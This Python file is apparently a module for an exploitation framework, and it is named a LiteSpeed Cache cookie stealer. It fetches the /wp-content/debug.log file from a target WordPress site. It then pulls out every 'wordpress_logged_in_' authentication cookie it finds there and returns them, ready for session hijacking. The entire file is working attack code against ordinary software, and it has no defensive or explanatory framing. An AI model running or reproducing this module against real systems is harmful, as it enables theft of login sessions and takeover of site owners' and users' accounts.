'''
name : WordPress LiteSpeed Cache Cookie Stealer Module
description : This module exploits a vulnerability in the LiteSpeed Cache plugin to steal authentication cookies.
version : 1.0
'''

import requests
import json

def access_debug_log(target_url, user_agent):
    print(f"[*] Attempting to access debug log at {target_url}")
    headers = {
        "User-Agent": f"{user_agent}"
    }
    try:
        res = requests.get(
            url=target_url,
            headers=headers,
            timeout=(6, 6)
        )
        if res.status_code == 200:
            print("[+] Successfully accessed debug log.")
            return res.text
        else:
            print(f"[-] Failed to access debug log. Status code: {res.status_code}")
            return None
    except Exception as e:
        print(f"[-] Error accessing debug log: {e}")
        return None

def get_cookies_from_log(log_content):
    print("[*] Extracting cookies from debug log...")
    cookies = []
    ret = []
    for line in log_content.splitlines():
        if "Cookie:" in line:
            cookie_part = line.split("Cookie:")[1].strip()
            cookies.append(cookie_part)
    if cookies:
        cookies = list(set(cookies))
        cookies = [cookie for cookie in cookies if cookie]
        cookies = [cookie for cookie in cookies if "wordpress_logged_in_" in cookie]
        ret = [
            {
                k.strip(): v
                for part in cookie.split(';')
                if '=' in part
                for k, v in [part.strip().split('=', 1)]
            }
            for cookie in cookies
        ]
        print(f"[+] Found {len(ret)} cookies in debug log.")
        return ret
    else:
        print("[-] No cookies found in debug log.")
        return None

def run(ip, user_agent):
    print("[*] Running WordPress LiteSpeed Cache Cookie Stealer module...")
    print(f"[*] Target IP: {ip}")
    target_url = f"http://{ip}/wp-content/debug.log"

    log_content = access_debug_log(target_url, user_agent)
    if not log_content:
        print("[-] No log content retrieved. Exiting.")
        return -1
    cookies = get_cookies_from_log(log_content)
    if not cookies:
        print("[-] No cookies extracted. Exiting.")
        return -1
    print("[*] Got cookies")
    return cookies

